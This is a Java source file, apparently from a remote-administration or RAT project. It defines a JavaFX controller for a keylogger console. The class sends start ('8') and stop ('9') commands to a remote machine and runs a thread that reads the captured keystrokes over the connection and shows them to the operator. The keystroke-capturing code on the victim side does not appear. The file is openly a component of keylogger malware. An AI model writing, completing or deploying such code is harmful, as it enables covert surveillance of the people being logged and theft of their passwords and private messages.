package client;

import javafx.fxml.FXML;
import javafx.scene.control.TextArea;

import java.io.IOException;

public class ClientKeyloggerController {
    public ClientController clientController;

    @FXML
    private TextArea txtLog;

    public int running = 0;

    public String keylog = "";

    private StringBuilder stringBuilder = new StringBuilder();

    public class KeyloggerThread extends Thread{

        public void run() {
            try {
                while (true)
                {
                    String key = clientController.br.readLine();
                    if (key.length()>0) {
                        keylog = stringBuilder.append(key).append(" ").toString();
                    }
                    txtLog.setText(keylog);
                }

            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public KeyloggerThread keyloggerThread = new KeyloggerThread();
    public void start() throws IOException {
        if (running == 0)
        {
            running = 1;
            keyloggerThread = new KeyloggerThread();
            keyloggerThread.start();
            clientController.writeData("8");
        }
    }

    public void stop() throws IOException {
        if (running == 1)
        {
            running = 0;
            clientController.writeData("9");
            keyloggerThread.interrupt();
            keyloggerThread = new KeyloggerThread();
        }
    }


}
